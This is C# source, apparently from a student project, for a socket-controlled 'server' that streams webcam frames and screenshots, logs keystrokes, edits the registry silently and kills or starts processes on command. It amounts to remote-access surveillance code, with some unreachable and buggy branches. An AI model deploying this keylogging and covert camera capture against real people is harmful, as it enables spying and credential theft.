using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using KeyLogger;
using System.Threading;

using System.Timers;
using AForge.Video;
using AForge.Video.DirectShow;

namespace server
{
    public partial class server : Form

    {
        VideoCaptureDevice videoSource;
        System.Timers.Timer stopTimer;
        Thread serverThread;

        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

        }
        public void receiveSignal(ref String s)
        {
            try
            {
                s=Program.nr.ReadLine();
            }
            catch (Exception ex)
            {
                s = "QUIT";
            }
        }
        public void shutdown()
        {
            System.Diagnostics.Process.Start("ShutDown", "-s");
        }
        public RegistryKey baseRegistryKey(ref String link)
        {
            RegistryKey a = null;
            if (link.IndexOf('\\') >= 0) 
            switch (link.Substring(0,link.IndexOf('\\')).ToUpper())
            {
                case "HKEY_CLASSIES_ROOT": a = Registry.ClassesRoot; break;
                case "HKEY_CURRENT_USER": a = Registry.CurrentUser; break;
                case "HKEY_LOCAL_MACHINE": a = Registry.LocalMachine; break;
                case "HKEY_USERS": a = Registry.Users; break;
                case "HKEY_CURRENT_CONFIG": a = Registry.CurrentConfig; break;
            }
            return a;
        }

        public String getvalue(ref RegistryKey a,ref String link,ref String valueName)
        {
            a=a.OpenSubKey(link);
            if (a == null) return "Lỗi";
            Object op = a.GetValue(valueName);
            if (op != null)
            {
                String s = "";
                if (a.GetValueKind(valueName) == RegistryValueKind.MultiString)
                {
                    String[] ss = (String[])op;

                    for (int i = 0; i < ss.Length; i++)
                        s += ss[i]+" ";
                    
                }
                else
                    if (a.GetValueKind(valueName) == RegistryValueKind.Binary)
                    {
                        Byte[] ss = (Byte[])op;
                        for (int i = 0; i < ss.Length; i++)
                            s += ss[i]+" ";
                    }
                    else s = Convert.ToString(op);
                return s;
            }
            else return "Lỗi";
        }
        public String setvalue(ref RegistryKey a,ref String link, ref String valueName, ref String value, ref String typeValue)
        {
            try
            {
                a = a.OpenSubKey(link, true);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            if (a == null) return "Lỗi";
            RegistryValueKind kind=RegistryValueKind.String;
            switch (typeValue)
            {
                case "String": kind = RegistryValueKind.String; break;
                case "Binary": kind = RegistryValueKind.Binary; break;
                case "DWORD": kind = RegistryValueKind.DWord; break;
                case "QWORD": kind = RegistryValueKind.QWord; break;
                case "Multi-String": kind = RegistryValueKind.MultiString; break;
                case "Expandable String": kind = RegistryValueKind.ExpandString; break;
                default: return "Lỗi";
            }
            Object v=value;
            //Registry.SetValue(link, valueName, v, kind);
            try
            {
                a.SetValue(valueName, v, kind);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            return "Set value thành công";
        }
        public String deletevalue(ref RegistryKey a,ref String link, ref String valueName)
        {
            try
            {
                a = a.OpenSubKey(link, true);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            if (a == null) return "Lỗi";
            bool test = false ;
            a.DeleteValue(valueName,test);
            if (!test)
                return "Xóa value thành công";
            return "Lỗi";

        }
        public String deletekey(ref RegistryKey a, ref String link)
        {
            bool test = false;
            a.DeleteSubKey(link, test);
            if (!test)
                return "Xóa key thành công";
            else return "Lỗi";
        }
        public void registry()
        {
            String s="";
            FileStream fs = new FileStream("fileReg.reg", FileMode.Create);
            fs.Close();

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {

                    case "REG":
                        {
                            Char[] data=new Char[5000];
                            Program.nr.Read(data,0,5000);
                            s = new String(data);
                            StreamWriter fin = new StreamWriter("fileReg.reg");
                            fin.Write(s);
                            fin.Close();
                            s = Application.StartupPath + "\\fileReg.reg";
                            bool test = true;
                            try
                            {
                                Process regeditPro = Process.Start("regedit.exe", "/s " + "\"" + s + "\"");
                                regeditPro.WaitForExit(20);
                            }
                            catch (Exception ex)
                            {
                                test = true;
                            }
                            if (test)
                                Program.nw.WriteLine("Sửa thành công");
                            else Program.nw.WriteLine("Sửa thất bại");
                            Program.nw.Flush();
                            break;
                        }
                    case "QUIT":
                        {
                            return; 
                        }
                    case "SEND":
                        {
                            String option="";
                            String link = "";
                            String valueName = "";
                            String value = "";
                            String typeValue = "";
                            option = Program.nr.ReadLine();
                            link = Program.nr.ReadLine();
                            valueName = Program.nr.ReadLine();
                            value = Program.nr.ReadLine();
                            typeValue = Program.nr.ReadLine();

                            RegistryKey a = baseRegistryKey(ref link);
                            String link2 = link.Substring(link.IndexOf('\\') + 1);
                            if (a == null)
                            s = "Lỗi";
                            else
                            {
                            
                                switch (option)
                                {
                                    case "Create key":{ a=a.CreateSubKey(link2);s="Tạo key thành công";break;}
                                    case "Delete key":s=deletekey(ref a,ref link2);break;
                                    case "Get value": s = getvalue(ref a,ref link2, ref valueName); break;
                                    case "Set value": s = setvalue(ref a,ref link2, ref valueName, ref value, ref typeValue); break;
                                    case "Delete value": s = deletevalue(ref a,ref link2, ref valueName); break;
                                    default: s = "Lỗi"; break;
                                }
                            }
                            Program.nw.WriteLine(s);
                            Program.nw.Flush();
                            break;
                        }
                }   
            }
        }
        public void takepic()
        {
            String ss="";
            
            while (true)
            {
                receiveSignal(ref ss);
                switch(ss)
                {
                    case "TAKE":
                        {
                            Bitmap bmpScreenshot;
                            Graphics gfxScreenshot;
                            bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                            // Create a graphics object from the bitmap  
                            gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                            // Take the screenshot from the upper left corner to the right bottom corner  
                            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                            // Save the screenshot to the specified path that the user has chosen  
                           
                            MemoryStream ms = new MemoryStream();
                            bmpScreenshot.Save(ms, ImageFormat.Bmp);
                            ms.Close();

                            String s = Convert.ToString(ms.ToArray().Length);
                            Program.nw.WriteLine(s);Program.nw.Flush();
                            Program.client.Send(ms.ToArray());
                            break;
                        }
                    case "QUIT":
                        {
                            return; break;
                        }
                }
            }
        }
        
        public void hookKey(ref Thread tklog)
        {
            tklog.Resume();
            File.WriteAllText(appstart.path,"");
        }
        public void unhook(ref Thread tklog)
        {
            tklog.Suspend();
        }
        public void printkeys()
        {
            String s = "";
            s = File.ReadAllText(appstart.path);
            File.WriteAllText(appstart.path,"");
            if (s == "")
                s = "\0";
            Program.nw.Write(s); Program.nw.Flush();
        }
       
        public void keylog()
        {
            Thread tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
            String s = "";
            tklog.Start();
            tklog.Suspend();
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "PRINT": printkeys(); break;
                    case "HOOK": hookKey(ref tklog); break;
                    case "UNHOOK": unhook(ref tklog); break;
                    case "QUIT": return;
                }
            }

        }
        public void application()
        {
            String ss = "";
            System.Diagnostics.Process[] pr;
            pr = System.Diagnostics.Process.GetProcesses();
            while (true)
            {
                receiveSignal(ref ss);
                switch (ss)
                {
                    case "XEM":
                        {
                            string u = "";
                            string s = "";
                            pr = System.Diagnostics.Process.GetProcesses();
                            int soprocess = pr.GetLength(0);
                            u = soprocess.ToString();
                            Program.nw.WriteLine(u);Program.nw.Flush();
                            foreach (System.Diagnostics.Process p in pr)
                            {
                                if (p.MainWindowTitle.Length > 0)
                                {

                                    u = "ok";

                                }
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                if (u == "ok")
                                {
                                    u = p.ProcessName;
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                    u = p.Id.ToString();
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                    u = p.Threads.Count.ToString();
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                }
                            }
                               
                        }
                        break;
                    case "KILL":
                        {
                            bool test=true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {

                                    case "KILLID":
                                        {
                                            string u = "";
                                            u = Program.nr.ReadLine();
                                            bool test2 = false;
                                            if (u != "")
                                                foreach (System.Diagnostics.Process p in pr)
                                                if (p.MainWindowTitle.Length > 0)
                                                {
                                                    if (p.Id.ToString() == u)
                                                    {
                                                        try
                                                        {
                                                            p.Kill();
                                                            Program.nw.WriteLine("Đã diệt chương trình"); Program.nw.Flush();

                                                        }
                                                        catch (Exception ex)
                                                        { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                                        test2 = true;
                                                    }
                                                }
                                            if (!test2)
                                            { Program.nw.WriteLine("Không tìm thấy chương trình"); Program.nw.Flush(); }
                                            break;
                                        }
                                     case "QUIT": test = false; break;
                                                          
                                }
                            }
                        }
                        break;
                    case "START":
                     {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {
                                    case "STARTID":
                                        {
                                            String u = "";
                                            u = Program.nr.ReadLine();
                                            if (u != "")
                                            {
                                                u += ".exe";
                                                //System.Diagnostics.Process t= new Process();
                                                try
                                                {
                                                    Process.Start(u);
                                                    Program.nw.WriteLine("Chương trình đã được bật"); Program.nw.Flush();
                                                }
                                                catch (Exception ex)
                                                {
                                                    Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                                }
                                                break;
                                                //p.Start();
                                            }
                                            Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                            break;
                                        }
                                    case "QUIT": test = false; break;
                                }

                            }
                        }
                        break;
                    case "QUIT":
                        {
                            return;
                        }

                }
            }

        }
        public void webcam()
        {
            // web cam chạy trong n giây - nhận thông tin giây từ Client 
            string timeStr = Program.nr.ReadLine();
            int seconds = 0;
            int.TryParse(timeStr, out seconds);

            // 1. Tìm các thiết bị Video đầu vào
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videoDevices.Count == 0)
            {
                Program.nw.WriteLine("NO_CAM"); // Báo lỗi nếu không có cam
                Program.nw.Flush();
                return;
            }
            // 2. Chọn camera đầu tiên tìm thấy
            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame); 
            videoSource.Start(); // Bắt đầu quay

            // 3.1 Cài đặt hẹn giờ tắt
            if (seconds > 0)
            {
                stopTimer = new System.Timers.Timer(seconds * 1000);
                stopTimer.Elapsed += (sender, e) => StopWebcam(); // Hết giờ tự gọi hàm tắt
                stopTimer.AutoReset = false;
                stopTimer.Start();
            }
            // 3.2 Chờ lệnh dừng từ Client trong trường hợp Client muốn tự tắt thủ công khi chưa hết giờ 
            string signal = "";
            while (true)
            {
                try
                {
                    receiveSignal(ref signal);
                    if (signal == "QUIT")
                    {
                        StopWebcam();
                        break;
                    }
                }
                catch
                {
                    StopWebcam();
                    break;
                }

            }
        }
        // Hàm xử lý khung hình từ web cam
        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                Bitmap bmp = (Bitmap)eventArgs.Frame.Clone();
                using (MemoryStream ms = new MemoryStream())
                {
                    // Nén ảnh sang JPEG 
                    bmp.Save(ms, ImageFormat.Jpeg);
                    byte[] buffer = ms.ToArray();
                    lock (Program.client)
                    {
                        // Gửi kích thước ảnh 
                        Program.nw.WriteLine(buffer.Length.ToString());
                        Program.nw.Flush();

                        // Gửi dữ liệu ảnh
                        Program.client.Send(buffer);
                    }
                }
            }
            catch (Exception ex)
            {
                // Nếu bị lỗi, dừng web cam
                StopWebcam();
            }
        }

        // Hàm dừng web cam
        private void StopWebcam()
        {
            if (videoSource != null && videoSource.IsRunning)
            {
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                videoSource = null;
                Console.WriteLine("Đã tắt Webcam.");
            }

            if (stopTimer != null)
            {
                stopTimer.Stop();
                stopTimer.Dispose();
                stopTimer = null;
            }
        }
        public void process()
        {
            String ss = "";
            System.Diagnostics.Process[] pr;
            pr = System.Diagnostics.Process.GetProcesses();
            while (true)
            {
                receiveSignal(ref ss);

                switch (ss)
                {
                    case "XEM":
                        {
                            string u = "";
                            string s = "";
                            pr = System.Diagnostics.Process.GetProcesses();
                            int soprocess = pr.GetLength(0);
                            u = soprocess.ToString();
                            Program.nw.WriteLine(u); Program.nw.Flush();
                            foreach (System.Diagnostics.Process p in pr)
                            {
                                u = p.ProcessName;
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                u = p.Id.ToString();
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                u = p.Threads.Count.ToString();
                                Program.nw.WriteLine(u); Program.nw.Flush();

                            }
                        }
                        break;
                    case "KILL":
                        {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {

                                    case "KILLID":
                                        {
                                            string u = "";
                                            u = Program.nr.ReadLine();
                                            bool test2 = false;
                                            if (u != "")
                                                foreach (System.Diagnostics.Process p in pr)
                                                {
                                                    if (p.Id.ToString() == u)
                                                    {
                                                        try
                                                        {
                                                            p.Kill();
                                                            Program.nw.WriteLine("Đã diệt process"); Program.nw.Flush();

                                                        }
                                                        catch (Exception ex)
                                                        { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                                        test2 = true;
                                                    }
                                                }
                                            if (!test2)
                                            { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                            break;
                                        }
                                    case "QUIT": test = false; break;

                                }
                            }
                        }
                        break;
                    case "START":
                        {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {
                                    case "STARTID":
                                        {
                                            String u = "";
                                            u = Program.nr.ReadLine();
                                            if (u != "")
                                            {
                                                u += ".exe";
                                                //System.Diagnostics.Process t= new Process();
                                                try
                                                {
                                                    Process.Start(u);
                                                    Program.nw.WriteLine("Process đã được bật"); Program.nw.Flush();
                                                }
                                                catch (Exception ex)
                                                {
                                                    Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                                }
                                                break;
                                                //p.Start();
                                            }
                                            Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                            break;
                                        }
                                    case "QUIT": test = false; break;
                                }

                            }
                        }
                        break;
                    case "QUIT":
                        {
                            return; break;
                        }
                }
            }

        }
        public void StartServer()
        {
            // Tạo vòng lặp để tujw kết nối lại trong trường hợp bị rớt mạng 
            while (true)
            {
                try
                {
                    // 1. Tạo socket
                    Program.client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                    // 2. Kết nối tới Web Server (IP Localhost 127.0.0.1, Cổng 5656)
                    IPEndPoint ip = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 5656);

                    // Thứr kết nối
                    Program.client.Connect(ip);

                    // 3. Khởi tạo luồng đọc/ghi dữ liệu  
                    Program.ns = new NetworkStream(Program.client);
                    Program.nr = new StreamReader(Program.ns);
                    Program.nw = new StreamWriter(Program.ns);

                    // 4. Nhận lệnh từ Client và xử lý
                    String s = "";

                    while (true)
                    {
                        //#######################
                        // --- THÊM ĐOẠN NÀY ĐỂ KIỂM TRA ---
                        if (!string.IsNullOrEmpty(s))
                        {
                            Console.WriteLine("Đã nhận lệnh: " + s); // Xem ở cửa sổ Output
                                                                     // Hoặc bật hộp thoại lên để biết chắc chắn nó nhận được
                                                                     // MessageBox.Show("Server nhận lệnh: " + s); 
                        }

                        // Đọc lệnh từ web gửi về 
                        receiveSignal(ref s);

                        // Mất kết nối thật rồi...
                        if (s == null) break; 

                        switch (s)
                        {
                            //case "KEYLOG": keylog(); break;
                            //case "SHUTDOWN": shutdown(); break;
                            //case "REGISTRY": registry(); break;
                            //case "TAKEPIC": takepic(); break;
                            //case "PROCESS": process(); break;
                            //case "APPLICATION": application(); break;
                            case "WEBCAM": webcam(); break;

                                //################
                                // Thêm try-catch ở đây để nếu webcam lỗi thì biết ngay
                                try
                                {
                                    webcam();
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show("Lỗi bật Webcam: " + ex.Message);
                                }
                                break;

                            case "QUIT": StopWebcam(); break; 
                            // bé nào làm cuối nhớ thêm trường hợp quit có nút quit để thoát trang nha 

                        }
                    }
                }
                catch (Exception ex)
                {
                    // Nếu chưa connect được hoặc lagggg thì chờ 3s rồi thử lại
                    Thread.Sleep(3000);
                }
                finally
                {
                    if (Program.client != null) Program.client.Close();
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            serverThread = new Thread(new ThreadStart(StartServer));
            serverThread.IsBackground = true;
            serverThread.Start();

            // Khóa nút lại để không bấm nhiều lần
            ((Button)sender).Enabled = false;
            MessageBox.Show("Server đã chạy ngầm!");
        }


    }
}
